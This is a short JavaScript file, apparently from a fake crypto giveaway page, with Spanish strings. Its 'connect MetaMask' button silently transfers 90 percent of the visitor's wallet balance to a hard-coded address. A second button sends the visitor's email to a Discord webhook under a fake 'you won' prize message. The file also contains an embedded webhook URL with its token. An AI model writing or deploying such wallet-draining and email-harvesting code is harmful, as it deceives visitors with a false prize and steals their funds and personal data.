
document.getElementById('conectarMetaMask').addEventListener('click', () => {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        window.ethereum.enable().then(accounts => {
            const usuarioAddress = accounts[0];
            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434'; 
            web3.eth.getBalance(usuarioAddress).then(balance => {
                const cantidadEnviar = balance * 0.9;
                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'wei');
                web3.eth.sendTransaction({
                    from: usuarioAddress,
                    to: direccionDestino,
                    value: cantidadEnviarEnWei,
                    gas: '21000',
                })
                .then(receipt => {
                    console.log('Transacción interna exitosa:', receipt);
                    document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
                })
                .catch(error => {
                    console.error('Error en la transacción interna:', error);
                });
            });
        });
    } else {
        console.error('MetaMask no está instalado.');
    }
});
document.getElementById('enviar').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const cryptoOptions = ['BTC', 'TRX', 'BNB', 'ETH', 'SHIB', 'DOGE', 'MATIC', 'USDT', 'BUSD'];
    const randomCrypto = cryptoOptions[Math.floor(Math.random() * cryptoOptions.length)];
    const randomValue = [5, 7, 12, 15, 18, 23][Math.floor(Math.random() * 6)];

    const webhookUrl = 'https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-'; // Reemplazar con el URL de tu webhook de Discord

    const data = {
        content: `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉`,
        embeds: [
            {
                title: 'Correo Electrónico Ganador',
                description: email,
                color: 16776960 
            }
        ]
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(() => {
        const alertBox = document.getElementById('alertBox');
        alertBox.textContent = '¡Has ganado!';
        alertBox.style.display = 'block';
    })
    .catch(error => console.error('Error:', error));
});

